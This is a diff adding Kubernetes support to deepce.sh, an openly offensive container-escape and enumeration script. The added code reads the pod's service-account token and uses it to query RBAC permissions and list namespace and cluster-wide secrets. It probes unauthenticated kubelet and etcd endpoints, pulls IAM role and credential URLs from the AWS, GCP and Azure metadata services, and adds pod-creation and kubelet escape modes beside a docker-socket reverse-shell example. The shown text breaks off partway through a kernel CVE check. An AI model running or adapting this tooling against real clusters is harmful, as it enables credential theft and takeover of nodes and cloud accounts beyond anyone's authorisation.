@@ -1,7 +1,7 @@
 #!/bin/sh
 
 # shellcheck disable=SC2034
-VERSION="v0.1.0"
+VERSION="v0.2.0"
 ADVISORY="deepce should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission."
 
 ###########################################
@@ -68,6 +68,15 @@ Usage: ${0##*/} [OPTIONS...]
     CVE-2019-5746
     CVE-2019-5021
     SYS_MODULE           Exploit the SYS_MODULE privilege to create a malicious kernel module and obtain root on the host
+    K8S_POD              Create privileged pod via Kubernetes API (requires create pods permission)
+    K8S_KUBELET          Execute command via unauthenticated kubelet API on port 10250
+
+  ${DG}[Kubernetes Options]$NC
+  -k,  --kubernetes      Force Kubernetes enumeration mode
+  -km, --k8s-metadata    Check cloud metadata endpoints (AWS/GCP/Azure)
+  -ke, --k8s-exploit     Run Kubernetes-specific exploit chains
+       --token           Path to service account token (default: /var/run/secrets/kubernetes.io/serviceaccount/token)
+       --k8s-api         Override Kubernetes API server URL (default: from KUBERNETES_SERVICE_HOST env)
 
   ${DG}[Payloads & Options]$NC
   -i, --ip               The local host IP address for reverse shells to connect to
@@ -93,6 +102,12 @@ Usage: ${0##*/} [OPTIONS...]
 
   $DG# Exploit an exposed docker sock to get a reverse shell as root on the host$NC
   ./deepce.sh -e SOCK -l -i 192.168.0.23 -p 4444
+
+  $DG# Enumerate Kubernetes and check cloud metadata$NC
+  ./deepce.sh -k -km
+
+  $DG# Escape via privileged pod creation using K8s SA token$NC
+  ./deepce.sh -e K8S_POD -cmd id
 
 EOF
 }
@@ -129,10 +144,37 @@ TIP_CVE_2025_9074="Docker Desktop versions between 4.25 to 4.44.2 on Windows and
 
 TIP_SYS_MODULE="Giving the container the SYS_MODULE privilege allows for kernel modules to be mounted. Using this, a malicious module can be used to execute code as root on the host."
 
+TIP_CVE_2024_21626="runc < 1.1.12 is vulnerable to Leaky Vessels (CVE-2024-21626). Internal file descriptor leak allows accessing host filesystem via /proc/self/fd/. See https://www.wiz.io/blog/leaky-vessels-container-escape-vulnerabilities"
+TIP_CVE_2024_23651="BuildKit < 0.12.5 / Docker < 25.0.2 is vulnerable to a build-time mount cache race (CVE-2024-23651) that can allow container escape during image builds."
+TIP_CVE_2024_23652="BuildKit < 0.12.5 / Docker < 25.0.2 is vulnerable to arbitrary host file deletion via malicious RUN --mount directives (CVE-2024-23652)."
+TIP_CVE_2024_23653="BuildKit < 0.12.5 / Docker Desktop < 4.27.1 is vulnerable to a GRPC privilege check bypass (CVE-2024-23653) allowing build-time container escape via custom Dockerfile syntax."
+TIP_CVE_2024_1086="Linux kernel < 6.1.76 / < 6.6.15 is vulnerable to a use-after-free in netfilter nf_tables (CVE-2024-1086). Actively exploited by ransomware groups (RansomHub, Akira) for host escape. See https://github.com/Notselwyn/CVE-2024-1086"
+TIP_CVE_2025_31133="runc < 1.2.8 is vulnerable to mount masking bypass (CVE-2025-31133). Symlink via /dev/null allows write access to procfs entries enabling host kernel parameter manipulation."
+TIP_CVE_2025_52565="runc < 1.2.8 is vulnerable to /dev/console race condition (CVE-2025-52565). Mount race exploits give write access to /proc/sysrq-trigger on the host."
+TIP_CVE_2025_52881="runc < 1.2.8 is vulnerable to LSM relabel bypass (CVE-2025-52881). Race condition allows writes to /proc/sys/kernel/core_pattern for full host escape, bypassing AppArmor and SELinux."
+
+TIP_K8S_SA_TOKEN="Service account token found and API reachable. Enumerate RBAC permissions to identify privilege escalation paths within the cluster."
+TIP_K8S_ANON_API="Kubernetes API server accepts anonymous requests. Cluster enumeration possible without credentials."
+TIP_K8S_CREATE_PODS="Service account can create pods. Escape to the node by creating a privileged pod with a hostPath / mount.
+deepce.sh -e K8S_POD -cmd id
+See https://bishopfox.com/blog/kubernetes-pod-privilege-escalation"
+TIP_K8S_KUBELET="Unauthenticated kubelet API (port 10250) detected. List pods and execute commands in any container on this node without audit logging.
+deepce.sh -e K8S_KUBELET -cmd id
+See https://www.aquasec.com/blog/kubernetes-exposed-exploiting-the-kubelet-api/"
+TIP_K8S_ETCD="Unauthenticated etcd access is equivalent to cluster-admin. All cluster secrets, RBAC policies, and SA tokens are readable and writable."
+TIP_K8S_METADATA="Cloud instance metadata is accessible from this pod. IAM credentials and service account tokens may be extractable for cloud infrastructure compromise."
+TIP_K8S_HOSTPATH="Sensitive host path mounts detected. Host filesystem access may allow reading node credentials, kubeconfig, or kubelet certificates."
+TIP_K8S_ESCALATE="Service account has 'escalate' or 'bind' permission. Bind current SA to cluster-admin ClusterRole for full cluster control."
+TIP_K8S_SECRETS="Service account can list secrets cluster-wide. This may expose credentials, image pull secrets, and other service account tokens."
+
+SA_TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount/token"
+SA_CA_PATH="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+SA_NS_PATH="/var/run/secrets/kubernetes.io/serviceaccount/namespace"
+
 DANGEROUS_GROUPS="docker\|lxd\|root\|sudo\|wheel"
 DANGEROUS_CAPABILITIES="cap_sys_admin\|cap_sys_ptrace\|cap_sys_module\|dac_read_search\|dac_override\|cap_sys_rawio\|cap_mknod"
 
-CONTAINER_CMDS="docker lxc rkt kubectl podman"
+CONTAINER_CMDS="docker lxc rkt kubectl podman crictl"
 USEFUL_CMDS="curl wget gcc nc netcat ncat jq nslookup host hostname dig python python2 python3 nmap"
 
 ###########################################
@@ -143,6 +185,31 @@ USEFUL_CMDS="curl wget gcc nc netcat ncat jq nslookup host hostname dig python p
 # shellcheck disable=SC2046
 # shellcheck disable=SC2183 # word splitting here is on purpose
 ver() { printf "%03.0f%03.0f%03.0f" $(echo "$1" | tr '.' ' ' | cut -d '-' -f1); }
+
+getRuncVersion() {
+  runcVersion=""
+  if [ -x "$(command -v runc)" ]; then
+    runcVersion=$(runc --version 2>/dev/null | head -n1 | grep -o '[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*' | head -n1)
+  fi
+  # Fall back: parse from containerd output
+  if [ -z "$runcVersion" ] && [ -x "$(command -v containerd)" ]; then
+    runcVersion=$(containerd --version 2>/dev/null | grep -o 'runc [0-9.]*' | cut -d' ' -f2)
+  fi
+}
+
+getContainerRuntime() {
+  containerRuntime="unknown"
+  if [ -S "/var/run/crio/crio.sock" ]; then
+    containerRuntime="cri-o"
+  fi
+  if [ -S "/run/containerd/containerd.sock" ] || [ -S "/var/run/containerd/containerd.sock" ]; then
+    containerRuntime="containerd"
+  fi
+  if [ -S "/var/run/docker.sock" ] || [ -x "$(command -v docker)" ]; then
+    containerRuntime="docker"
+  fi
+  printResult "Container Runtime ......." "$containerRuntime" "Unknown"
+}
 
 ###########################################
 #--------------) Printing (---------------#
@@ -330,33 +397,50 @@ See ${UNDERLINED}https://stealthcopter.github.io/deepce${NC}"
 ###########################################
 
 containerCheck() {
-  # Are we inside docker?
   inContainer=""
+
+  # Docker: .dockerenv marker
   if [ -f "/.dockerenv" ]; then
     inContainer="1"
     containerType="docker"
   fi
 
-  # Additional check in case .dockerenv removed
-  if grep "/docker/" /proc/1/cgroup -qa; then
+  # Docker: cgroup check
+  if grep "/docker/" /proc/1/cgroup -qa 2>/dev/null; then
     inContainer="1"
     containerType="docker"
   fi
 
-  #Docker check: cat /proc/1/attr/current
-
-  # Are we inside kubenetes?
-  if grep "/kubepod" /proc/1/cgroup -qa; then
+  # Kubernetes: KUBERNETES_SERVICE_HOST is always set in pods (most reliable)
+  if [ -n "$KUBERNETES_SERVICE_HOST" ]; then
     inContainer="1"
     containerType="kubernetes"
   fi
 
-  # Are we inside LXC?
-  if env | grep "container=lxc" -qa; then
+  # Kubernetes: service account secrets directory
+  if [ -d "/var/run/secrets/kubernetes.io" ]; then
+    inContainer="1"
+    containerType="kubernetes"
+  fi
+
+  # Kubernetes: cgroup patterns (kubepods for cgroup v1, system.slice/kube for cgroup v2)
+  if grep -q "kubepod\|/kube" /proc/1/cgroup 2>/dev/null; then
+    inContainer="1"
+    containerType="kubernetes"
+  fi
+
+  # Force Kubernetes mode via flag
+  if [ "$forceKubernetes" ]; then
+    inContainer="1"
+    containerType="kubernetes"
+  fi
+
+  # LXC
+  if env | grep "container=lxc" -qa 2>/dev/null; then
     inContainer="1"
     containerType="lxc"
   fi
-  if grep "/lxc/" /proc/1/cgroup -qa; then
+  if grep "/lxc/" /proc/1/cgroup -qa 2>/dev/null; then
     inContainer="1"
     containerType="lxc"
   fi
@@ -705,6 +789,561 @@ containerExploits() {
   containerExploitAPI
 }
 
+###########################################
+#-----------) Kubernetes Checks (----------#
+###########################################
+
+checkServiceAccount() {
+  printSection "Kubernetes Service Account"
+
+  # Allow operator to override token path
+  saToken="${k8sToken:-$SA_TOKEN_PATH}"
+
+  printQuestion "SA token present ........"
+  if [ -f "$saToken" ] && [ -r "$saToken" ]; then
+    printYesEx
+    k8sTokenData=$(cat "$saToken" 2>/dev/null)
+
+    # Decode JWT exp field without crypto (base64 decode middle segment)
+    jwtPayload=$(echo "$k8sTokenData" | cut -d'.' -f2)
+    # Pad base64 for decoding
+    padded=$(printf '%s' "$jwtPayload" | awk '{n=length($0)%4; if(n==2) printf "%s==",  $0; else if(n==3) printf "%s=", $0; else printf "%s", $0}')
+    tokenExp=$(printf '%s' "$padded" | base64 -d 2>/dev/null | grep -o '"exp":[0-9]*' | cut -d':' -f2)
+    if [ "$tokenExp" ]; then
+      printStatus "Token exp: $tokenExp (unix timestamp)"
+    fi
+  else
+    printNo
+    return
+  fi
+
+  printQuestion "SA namespace ............"
+  if [ -f "$SA_NS_PATH" ]; then
+    k8sNamespace=$(cat "$SA_NS_PATH" 2>/dev/null)
+    printSuccess "$k8sNamespace"
+  else
+    k8sNamespace="default"
+    printFail "Not found, assuming: $k8sNamespace"
+  fi
+
+  printQuestion "SA CA cert present ......"
+  if [ -f "$SA_CA_PATH" ]; then
+    printYes
+    curl_ca="--cacert $SA_CA_PATH"
+  else
+    printNo
+    curl_ca="-k"
+  fi
+
+  printTip "$TIP_K8S_SA_TOKEN"
+}
+
+checkK8sAPIServer() {
+  printSection "Kubernetes API Server"
+
+  # Build API base URL
+  if [ "$k8sAPIOverride" ]; then
+    k8sAPI="$k8sAPIOverride"
+  elif [ "$KUBERNETES_SERVICE_HOST" ]; then
+    k8sPort="${KUBERNETES_SERVICE_PORT:-443}"
+    k8sAPI="https://${KUBERNETES_SERVICE_HOST}:${k8sPort}"
+  else
+    printFail "KUBERNETES_SERVICE_HOST not set, cannot determine API URL"
+    return
+  fi
+
+  printResult "API Server URL .........." "$k8sAPI"
+
+  if ! [ -x "$(command -v curl)" ]; then
+    printError "curl required for K8s API checks"
+    return
+  fi
+
+  saToken="${k8sToken:-$SA_TOKEN_PATH}"
+  # shellcheck disable=SC2086
+  authHeader=""
+  if [ -f "$saToken" ] && [ -r "$saToken" ]; then
+    authHeader="-H \"Authorization: Bearer $(cat "$saToken")\""
+  fi
+
+  # Test anonymous access
+  printQuestion "Anonymous API access ...."
+  # shellcheck disable=SC2086
+  anonResp=$(curl -s $curl_ca --connect-timeout 3 "$k8sAPI/api/v1" 2>/dev/null | head -c 200)
+  if echo "$anonResp" | grep -q '"kind"'; then
+    printYesEx
+    printTip "$TIP_K8S_ANON_API"
+    k8sAnonAccess="1"
+  else
+    printNo
+  fi
+
+  # Test authenticated access
+  printQuestion "Authenticated API access "
+  if [ -f "$saToken" ] && [ -r "$saToken" ]; then
+    # shellcheck disable=SC2086
+    authResp=$(curl -s $curl_ca --connect-timeout 3 -H "Authorization: Bearer $(cat "$saToken")" "$k8sAPI/api/v1/namespaces" 2>/dev/null | head -c 200)
+    if echo "$authResp" | grep -q '"kind"'; then
+      printYesEx
+      k8sAuthAccess="1"
+    else
+      printNo
+    fi
+  else
+    printFail "No SA token"
+  fi
+
+  # Get K8s version
+  printQuestion "Kubernetes version ......"
+  # shellcheck disable=SC2086
+  k8sVer=$(curl -s $curl_ca --connect-timeout 3 "$k8sAPI/version" 2>/dev/null | grep -o '"gitVersion":"[^"]*' | cut -d'"' -f4)
+  if [ "$k8sVer" ]; then
+    printSuccess "$k8sVer"
+  else
+    printNo
+  fi
+}
+
+checkK8sRBAC() {
+  printSection "Kubernetes RBAC Permissions"
+
+  if ! [ -x "$(command -v curl)" ]; then
+    return
+  fi
+
+  saToken="${k8sToken:-$SA_TOKEN_PATH}"
+  if ! [ -f "$saToken" ] || ! [ -r "$saToken" ]; then
+    printFail "No SA token — skipping RBAC checks"
+    return
+  fi
+
+  if ! [ "$k8sAPI" ]; then
+    if [ "$KUBERNETES_SERVICE_HOST" ]; then
+      k8sPort="${KUBERNETES_SERVICE_PORT:-443}"
+      k8sAPI="https://${KUBERNETES_SERVICE_HOST}:${k8sPort}"
+    else
+      return
+    fi
+  fi
+
+  tokenData=$(cat "$saToken")
+  # shellcheck disable=SC2086
+
+  # Helper: selfsubjectaccessreview for a given verb/resource/group
+  canI() {
+    _verb="$1"; _resource="$2"; _group="${3:-}"
+    _body="{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"namespace\":\"${k8sNamespace:-default}\",\"verb\":\"$_verb\",\"resource\":\"$_resource\",\"group\":\"$_group\"}}}"
+    _resp=$(curl -s $curl_ca --connect-timeout 3 \
+      -X POST \
+      -H "Authorization: Bearer $tokenData" \
+      -H "Content-Type: application/json" \
+      -d "$_body" \
+      "$k8sAPI/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" 2>/dev/null)
+    echo "$_resp" | grep -q '"allowed":true'
+  }
+
+  # Check high-value permissions
+  printQuestion "Can create pods ........."
+  if canI create pods; then
+    printYesEx
+    k8sCanCreatePods="1"
+    printTip "$TIP_K8S_CREATE_PODS"
+  else
+    printNo
+  fi
+
+  printQuestion "Can exec in pods ........"
+  if canI create pods/exec; then
+    printYesEx
+  else
+    printNo
+  fi
+
+  printQuestion "Can list secrets ........"
+  if canI list secrets; then
+    printYesEx
+    k8sCanListSecrets="1"
+    printTip "$TIP_K8S_SECRETS"
+  else
+    printNo
+  fi
+
+  printQuestion "Can get secrets ........."
+  if canI get secrets; then
+    printYesEx
+  else
+    printNo
+  fi
+
+  printQuestion "Can list nodes .........."
+  if canI list nodes; then
+    printYesEx
+  else
+    printNo
+  fi
+
+  printQuestion "Can escalate ClusterRoles"
+  _body="{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"verb\":\"escalate\",\"resource\":\"clusterroles\",\"group\":\"rbac.authorization.k8s.io\"}}}"
+  _resp=$(curl -s $curl_ca --connect-timeout 3 \
+    -X POST \
+    -H "Authorization: Bearer $tokenData" \
+    -H "Content-Type: application/json" \
+    -d "$_body" \
+    "$k8sAPI/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" 2>/dev/null)
+  if echo "$_resp" | grep -q '"allowed":true'; then
+    printYesEx
+    k8sCanEscalate="1"
+    printTip "$TIP_K8S_ESCALATE"
+  else
+    printNo
+  fi
+
+  printQuestion "Can bind ClusterRoles ...."
+  _body="{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"verb\":\"bind\",\"resource\":\"clusterrolebindings\",\"group\":\"rbac.authorization.k8s.io\"}}}"
+  _resp=$(curl -s $curl_ca --connect-timeout 3 \
+    -X POST \
+    -H "Authorization: Bearer $tokenData" \
+    -H "Content-Type: application/json" \
+    -d "$_body" \
+    "$k8sAPI/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" 2>/dev/null)
+  if echo "$_resp" | grep -q '"allowed":true'; then
+    printYesEx
+    k8sCanBind="1"
+  else
+    printNo
+  fi
+}
+
+checkKubeletAPI() {
+  printSection "Kubelet API"
+
+  if [ "$noNetwork" ]; then
+    return
+  fi
+
+  if ! [ -x "$(command -v curl)" ]; then
+    printError "curl required for kubelet checks"
+    return
+  fi
+
+  # Get node IP — try env var, then hostname
+  nodeIP="${NODE_IP:-$(hostname -i 2>/dev/null | cut -d' ' -f1)}"
+  if ! [ "$nodeIP" ]; then
+    printFail "Cannot determine node IP"
+    return
+  fi
+
+  printQuestion "Kubelet port 10250 ......"
+  kubeletResp=$(curl -sk --connect-timeout 3 "https://${nodeIP}:10250/pods" 2>/dev/null | head -c 300)
+  if echo "$kubeletResp" | grep -q '"kind"'; then
+    printYesEx
+    k8sKubeletAnon="1"
+    printTip "$TIP_K8S_KUBELET"
+    # List pod/namespace combos for exploit targeting
+    podList=$(curl -sk --connect-timeout 3 "https://${nodeIP}:10250/pods" 2>/dev/null | \
+      grep -o '"name":"[^"]*","namespace":"[^"]*"' | head -10)
+    printStatus "Pods on this node:"
+    printStatus "$podList"
+    k8sKubeletHost="$nodeIP"
+  else
+    printNo
+  fi
+
+  # Port 10255 read-only (legacy, unauth)
+  printQuestion "Kubelet port 10255 ......"
+  roResp=$(curl -s --connect-timeout 3 "http://${nodeIP}:10255/pods" 2>/dev/null | head -c 100)
+  if echo "$roResp" | grep -q '"kind"'; then
+    printYesEx
+  else
+    printNo
+  fi
+}
+
+checkEtcdExposure() {
+  printSection "etcd Exposure"
+
+  if [ "$noNetwork" ]; then
+    return
+  fi
+
+  if ! [ -x "$(command -v curl)" ]; then
+    return
+  fi
+
+  etcdHost="${KUBERNETES_SERVICE_HOST:-}"
+  if ! [ "$etcdHost" ]; then
+    printFail "Cannot determine control plane IP"
+    return
+  fi
+
+  printQuestion "etcd port 2379 .........."
+  # Try etcd v3 health endpoint (no auth)
+  etcdResp=$(curl -s --connect-timeout 3 "http://${etcdHost}:2379/health" 2>/dev/null)
+  if echo "$etcdResp" | grep -q '"health"'; then
+    printYesEx
+    printTip "$TIP_K8S_ETCD"
+    # Try to list keys
+    printStatus "Attempting to list etcd keys..."
+    etcdKeys=$(curl -s --connect-timeout 3 \
+      -X POST "http://${etcdHost}:2379/v3/kv/range" \
+      -H "Content-Type: application/json" \
+      -d '{"key":"Cg==","range_end":"Cg==","limit":10}' 2>/dev/null | head -c 500)
+    printStatus "$etcdKeys"
+  else
+    printNo
+  fi
+}
+
+checkCloudMetadata() {
+  printSection "Cloud Metadata Endpoints"
+
+  if [ "$noNetwork" ]; then
+    return
+  fi
+
+  if ! [ -x "$(command -v curl)" ]; then
+    printError "curl required for metadata checks"
+    return
+  fi
+
+  # AWS EC2 / EKS
+  printQuestion "AWS metadata (IMDS) ....."
+  awsResp=$(curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/" 2>/dev/null | head -c 200)
+  if [ "$awsResp" ]; then
+    printYesEx
+    printTip "$TIP_K8S_METADATA"
+    # Try to get IAM role name
+    awsRole=$(curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null)
+    if [ "$awsRole" ]; then
+      printStatus "IAM role: $awsRole"
+      printStatus "Credentials URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/$awsRole"
+    fi
+    # Try IMDSv2 token
+    imdsv2Token=$(curl -s --connect-timeout 3 -X PUT \
+      -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
+      "http://169.254.169.254/latest/api/token" 2>/dev/null)
+    if [ "$imdsv2Token" ]; then
+      printStatus "IMDSv2 token obtained — use with X-aws-ec2-metadata-token header"
+    fi
+  else
+    printNo
+  fi
+
+  # GCP / GKE
+  printQuestion "GCP metadata ............"
+  gcpResp=$(curl -s --connect-timeout 3 \
+    -H "Metadata-Flavor: Google" \
+    "http://metadata.google.internal/computeMetadata/v1/" 2>/dev/null | head -c 100)
+  if [ "$gcpResp" ]; then
+    printYesEx
+    printTip "$TIP_K8S_METADATA"
+    gcpSA=$(curl -s --connect-timeout 3 \
+      -H "Metadata-Flavor: Google" \
+      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" 2>/dev/null)
+    printStatus "GCP service account: $gcpSA"
+  else
+    printNo
+  fi
+
+  # Azure / AKS
+  printQuestion "Azure metadata .........."
+  azureResp=$(curl -s --connect-timeout 3 \
+    -H "Metadata: true" \
+    "http://169.254.169.253/metadata/instance?api-version=2021-02-01" 2>/dev/null | head -c 200)
+  if [ "$azureResp" ]; then
+    printYesEx
+    printTip "$TIP_K8S_METADATA"
+    printStatus "$azureResp"
+  else
+    printNo
+  fi
+}
+
+checkHostPathMounts() {
+  printSection "Kubernetes hostPath Mounts"
+
+  # Sensitive host paths that indicate dangerous mounts
+  SENSITIVE_PATHS="/etc /etc/kubernetes /var/lib/kubelet /var/lib/docker /var/run/docker.sock /run/containerd/containerd.sock /proc /sys/fs/cgroup /root /home"
+
+  printQuestion "Sensitive host mounts ...."
+  foundSensitive=""
+  for p in $SENSITIVE_PATHS; do
+    # Check if mountinfo shows this path mounted from host (source outside overlay)
+    if grep -q " $p " /proc/self/mountinfo 2>/dev/null; then
+      mountSrc=$(grep " $p " /proc/self/mountinfo | head -1 | awk '{print $4}')
+      # Overlay and tmpfs are normal container mounts; anything else is suspicious
+      if ! echo "$mountSrc" | grep -q "overlay\|tmpfs\|cgroup\|proc\|sysfs"; then
+        printEx "  $p -> $mountSrc"
+        foundSensitive="1"
+      fi
+    fi
+  done
+
+  if ! [ "$foundSensitive" ]; then
+    printNo
+  else
+    printTip "$TIP_K8S_HOSTPATH"
+  fi
+
+  # Check for full root mount
+  printQuestion "Root filesystem mounted .."
+  if grep -q " / " /proc/self/mountinfo 2>/dev/null; then
+    rootMountSrc=$(grep " / " /proc/self/mountinfo | grep -v "overlay\|tmpfs" | head -1 | awk '{print $4}')
+    if [ "$rootMountSrc" ] && [ "$rootMountSrc" != "/" ]; then
+      printYesEx
+      printStatus "Host root at: $rootMountSrc"
+    else
+      printNo
+    fi
+  else
+    printNo
+  fi
+
+  # Runtime socket mounts (allows container escape)
+  printQuestion "Runtime socket mounted .."
+  if grep -q "docker.sock\|containerd.sock\|crio.sock" /proc/self/mountinfo 2>/dev/null; then
+    printYesEx
+    printTip "$TIP_WRITABLE_SOCK"
+  else
+    printNo
+  fi
+}
+
+checkK8sSecrets() {
+  printSection "Kubernetes Secrets"
+
+  if ! [ -x "$(command -v curl)" ]; then
+    return
+  fi
+
+  saToken="${k8sToken:-$SA_TOKEN_PATH}"
+  if ! [ -f "$saToken" ] || ! [ -r "$saToken" ]; then
+    return
+  fi
+
+  if ! [ "$k8sAPI" ]; then
+    if [ "$KUBERNETES_SERVICE_HOST" ]; then
+      k8sPort="${KUBERNETES_SERVICE_PORT:-443}"
+      k8sAPI="https://${KUBERNETES_SERVICE_HOST}:${k8sPort}"
+    else
+      return
+    fi
+  fi
+
+  tokenData=$(cat "$saToken")
+  ns="${k8sNamespace:-default}"
+
+  printQuestion "Secrets in namespace ...."
+  # shellcheck disable=SC2086
+  secretResp=$(curl -s $curl_ca --connect-timeout 3 \
+    -H "Authorization: Bearer $tokenData" \
+    "$k8sAPI/api/v1/namespaces/$ns/secrets" 2>/dev/null)
+  secretCount=$(echo "$secretResp" | grep -o '"name"' | wc -l)
+  if [ "$secretCount" -gt 0 ] 2>/dev/null; then
+    printSuccess "$secretCount secrets found in namespace $ns"
+    # List secret names and types
+    secretNames=$(echo "$secretResp" | grep -o '"name":"[^"]*' | cut -d'"' -f4 | head -20)
+    printStatus "$secretNames"
+    # Flag interesting types
+    if echo "$secretResp" | grep -q "kubernetes.io/dockerconfigjson\|Opaque\|kubernetes.io/tls"; then
+      printStatus "Interesting secret types detected (image pull secrets / TLS / opaque)"
+    fi
+  else
+    printNo
+  fi
+
+  # Try cluster-wide if have permissions
+  printQuestion "Cluster-wide secrets ...."
+  # shellcheck disable=SC2086
+  clusterSecretResp=$(curl -s $curl_ca --connect-timeout 3 \
+    -H "Authorization: Bearer $tokenData" \
+    "$k8sAPI/api/v1/secrets" 2>/dev/null)
+  clusterSecretCount=$(echo "$clusterSecretResp" | grep -o '"name"' | wc -l)
+  if [ "$clusterSecretCount" -gt 0 ] 2>/dev/null; then
+    printYesEx
+    printSuccess "$clusterSecretCount secrets cluster-wide"
+  else
+    printNo
+  fi
+}
+
+checkK8sNodeInfo() {
+  printSection "Kubernetes Node Info"
+
+  if ! [ -x "$(command -v curl)" ]; then
+    return
+  fi
+
+  saToken="${k8sToken:-$SA_TOKEN_PATH}"
+  if ! [ "$k8sAPI" ]; then
+    if [ "$KUBERNETES_SERVICE_HOST" ]; then
+      k8sPort="${KUBERNETES_SERVICE_PORT:-443}"
+      k8sAPI="https://${KUBERNETES_SERVICE_HOST}:${k8sPort}"
+    else
+      return
+    fi
+  fi
+
+  tokenData=""
+  if [ -f "$saToken" ] && [ -r "$saToken" ]; then
+    tokenData=$(cat "$saToken")
+  fi
+
+  printQuestion "Node list ..............."
+  # shellcheck disable=SC2086
+  nodeResp=$(curl -s $curl_ca --connect-timeout 3 \
+    -H "Authorization: Bearer $tokenData" \
+    "$k8sAPI/api/v1/nodes" 2>/dev/null)
+  nodeCount=$(echo "$nodeResp" | grep -o '"kind":"Node"' | wc -l)
+  if [ "$nodeCount" -gt 0 ] 2>/dev/null; then
+    printSuccess "$nodeCount nodes"
+    nodeIPs=$(echo "$nodeResp" | grep -o '"address":"[0-9.]*' | cut -d'"' -f4 | sort -u)
+    printStatus "Node IPs: $nodeIPs"
+  else
+    printNo
+  fi
+
+  printQuestion "Namespaces ..............."
+  # shellcheck disable=SC2086
+  nsResp=$(curl -s $curl_ca --connect-timeout 3 \
+    -H "Authorization: Bearer $tokenData" \
+    "$k8sAPI/api/v1/namespaces" 2>/dev/null)
+  nsNames=$(echo "$nsResp" | grep -o '"name":"[^"]*' | cut -d'"' -f4 | grep -v "^$" | head -20)
+  if [ "$nsNames" ]; then
+    printYes
+    printStatus "$nsNames"
+  else
+    printNo
+  fi
+}
+
+enumerateKubernetes() {
+  printSection "Enumerating Kubernetes"
+
+  # Initialize shared state
+  curl_ca="-k"
+  k8sAPI=""
+  k8sNamespace="default"
+  k8sCanCreatePods=""
+  k8sCanListSecrets=""
+  k8sCanEscalate=""
+  k8sCanBind=""
+  k8sKubeletAnon=""
+  k8sKubeletHost=""
+
+  checkServiceAccount
+  checkK8sAPIServer
+  checkK8sRBAC
+  checkHostPathMounts
+  checkKubeletAPI
+  checkEtcdExposure
+  if [ "$k8sCheckMetadata" ]; then
+    checkCloudMetadata
+  fi
+  checkK8sSecrets
+  checkK8sNodeInfo
+}
+
 enumerateContainers() {
   printSection "Enumerating Containers"
 
@@ -951,7 +1590,7 @@ checkDockerVersionExploits() {
     return
   fi
 
-  printQuestion "CVE–2019–13139 .........."
+  printQuestion "CVE-2019-13139 .........."
   if [ "$(ver "$dockerVersion")" -lt "$(ver 18.9.5)" ]; then
     printYesEx
     printTip "$TIP_CVE_2019_13139"
@@ -959,10 +1598,82 @@ checkDockerVersionExploits() {
     printNo
   fi
 
-  printQuestion "CVE–2019–5736 ..........."
+  printQuestion "CVE-2019-5736 ..........."
   if [ "$(ver "$dockerVersion")" -lt "$(ver 18.9.3)" ]; then
     printYesEx
     printTip "$TIP_CVE_2019_5736"
+  else
+    printNo
+  fi
+
+  # Leaky Vessels: BuildKit CVEs fixed in Docker 25.0.2
+  printQuestion "CVE-2024-23651/52/53 ...."
+  if [ "$(ver "$dockerVersion")" -lt "$(ver 25.0.2)" ]; then
+    printYesEx
+    printTip "$TIP_CVE_2024_23651"
+    printTip "$TIP_CVE_2024_23652"
+    printTip "$TIP_CVE_2024_23653"
+  else
+    printNo
+  fi
+}
+
+checkRuncVersionExploits() {
+  getRuncVersion
+  printResult "runc Version ............" "$runcVersion" "Version Unknown"
+  if ! [ "$runcVersion" ]; then
+    return
+  fi
+
+  # Leaky Vessels: runc FD leak — fixed in 1.1.12
+  printQuestion "CVE-2024-21626 .........."
+  if [ "$(ver "$runcVersion")" -lt "$(ver 1.1.12)" ]; then
+    printYesEx
+    printTip "$TIP_CVE_2024_21626"
+    # Live FD leak probe: check if any /proc/self/fd entry resolves outside container root
+    fdLeak=$(ls -la /proc/self/fd 2>/dev/null | grep -v "pipe:\|socket:\|/proc\|/dev" | grep "/" | head -3)
+    if [ "$fdLeak" ]; then
+      printStatus "Possible host FD references detected:"
+      printStatus "$fdLeak"
+    fi
+  else
+    printNo
+  fi
+
+  # November 2025 runc trio — fixed in 1.2.8
+  printQuestion "CVE-2025-31133/52565/52881"
+  if [ "$(ver "$runcVersion")" -lt "$(ver 1.2.8)" ]; then
+    printYesEx
+    printTip "$TIP_CVE_2025_31133"
+    printTip "$TIP_CVE_2025_52565"
+    printTip "$TIP_CVE_2025_52881"
+  else
+    printNo
+  fi
+}
+
+checkKernelVersionExploits() {
+  kernelFull=$(uname -r)
+  # Extract major.minor.patch for comparison
+  kernelShort=$(echo "$kernelFull" | grep -o '^[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*')
+  printResult "Kernel Version .........." "$kernelFull" "Unknown"
+  if ! [ "$kernelShort" ]; then
+    return
+  fi
+
+  # CVE-2024-1086: netfilter UAF — patched in 5.15.149, 6.1.76, 6.6.15, 6.7.3
+  kernelMajorMinor=$(echo "$kernelFull" | grep -o '^[0-9][0-9]*\.[0-9][0-9]*' | tr -d '.')
+  printQuestion "CVE-2024-1086 ..........."
+  vulnerable1086="0"
+  case "$kernelMajorMinor" in
+    515) [ "$(ver "$kernelShort")" -lt "$(ver 5.15.149)" ] && vulnerable1086="1" ;;
+    61)  [ "$(ver "$kernelShort")" -lt "$(ver 6.1.76)" ]  && vulnerable1086="1" ;;
+    66)  [ "$(ver "$kernelShort")" -lt "$(ver 6.6.15)" ]  && vulnerable1086="1" ;;
+    67)  [ "$(ver "$kernelShort")" -lt "$(ver 6.7.3)" ]   && vulnerable1086="1" ;;
+  esac
